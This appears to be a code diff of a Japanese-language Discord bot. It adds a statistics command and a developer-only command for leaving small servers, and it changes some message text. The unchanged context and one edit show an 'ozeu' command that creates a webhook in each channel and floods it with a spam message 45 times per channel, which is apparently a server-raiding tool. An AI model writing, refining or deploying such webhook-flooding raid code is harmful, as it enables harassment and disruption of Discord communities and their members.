@@ -6,6 +6,8 @@ from discord.ext import commands
 from discord import app_commands
 import asyncio
 from dotenv import load_dotenv
+import psutil
+import platform
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -168,7 +170,7 @@ async def ozeu(ctx, guild_id: int = None):
     async def send_with_webhook(channel):
         try:
             webhook = await channel.create_webhook(name="ZPlusWebhook")
-            for _ in range(50):
+            for _ in range(45):
                 await webhook.send(SPAM_MESSAGE, username="ガバマン")
         except Exception as e:
             print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
@@ -442,7 +444,7 @@ async def on_guild_join(guild: discord.Guild):
 @app_commands.describe(server_id="退出したいサーバーのID")
 async def leave(interaction: discord.Interaction, server_id: int):
     if interaction.user.id not in dev_users:
-        await interaction.response.send_message("❌ このコマンドは開発者専用です。", ephemeral=True)
+        await interaction.response.send_message("❌ 開発者権限を持っていません", ephemeral=True)
         return
 
     guild = bot.get_guild(server_id)
@@ -455,7 +457,7 @@ async def leave(interaction: discord.Interaction, server_id: int):
         await interaction.response.send_message(f"✅ サーバー「{guild.name}」 (ID: {guild.id}) から退出しました。", ephemeral=True)
         owner = await bot.fetch_user(OWNER_ID)
         embed = discord.Embed(
-            title="🚪 Botが手動でサーバーから退出しました",
+            title="🚪 Botがサーバーから退出しました",
             description=f"サーバー名: {guild.name}\nサーバーID: {guild.id}\n実行者: {interaction.user} (ID: {interaction.user.id})",
             color=discord.Color.orange(),
             timestamp=discord.utils.utcnow()
@@ -463,6 +465,49 @@ async def leave(interaction: discord.Interaction, server_id: int):
         await owner.send(embed=embed)
     except Exception as e:
         await interaction.response.send_message(f"❌ 退出に失敗しました: {e}", ephemeral=True)
+#----bot status----
+@tree.command(name="bot_stats", description="Botの統計情報を表示します")
+async def bot_stats(interaction: discord.Interaction):
+    process = psutil.Process(os.getpid())
+    memory_mb = process.memory_info().rss / 1024 / 1024
+    cpu_percent = psutil.cpu_percent(interval=1.0)
+    uptime = datetime.datetime.utcnow() - datetime.datetime.fromtimestamp(process.create_time())
+
+    total_guilds = len(bot.guilds)
+    total_members = sum(guild.member_count for guild in bot.guilds)
+
+    embed = discord.Embed(
+        title="📊 Botの統計情報",
+        color=discord.Color.blurple()
+    )
+    embed.add_field(name="🛡️ サーバー数", value=f"{total_guilds} 件", inline=True)
+    embed.add_field(name="👥 合計メンバー", value=f"{total_members} 人", inline=True)
+    embed.add_field(name="🕒 起動時間", value=str(uptime).split('.')[0], inline=False)
+    embed.add_field(name="🧠 メモリ使用量", value=f"{memory_mb:.2f} MB", inline=True)
+    embed.add_field(name="💻 CPU使用率", value=f"{cpu_percent:.1f} %", inline=True)
+    embed.add_field(name="⚙️ プラットフォーム", value=platform.system(), inline=True)
+    embed.timestamp = discord.utils.utcnow()
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@tree.command(name="auto_leave_small_servers", description="指定した人数以下のサーバーからBotを自動退出させます（開発者専用）")
+@app_commands.describe(min_members="この人数以下のサーバーから退出（例: 5）")
+async def auto_leave_small_servers(interaction: discord.Interaction, min_members: int):
+    if interaction.user.id not in dev_users:
+        await interaction.response.send_message("❌ 開発者専用コマンドです。", ephemeral=True)
+        return
+
+    left = 0
+    for guild in bot.guilds:
+        if guild.member_count <= min_members:
+            try:
+                await guild.leave()
+                left += 1
+            except Exception as e:
+                print(f"[auto_leave] {guild.name} からの退出失敗: {e}")
+
+    await interaction.response.send_message(f"✅ {min_members}人以下のサーバーから {left} 件 退出しました。", ephemeral=True)
+
 
 bot.run(TOKEN)
 
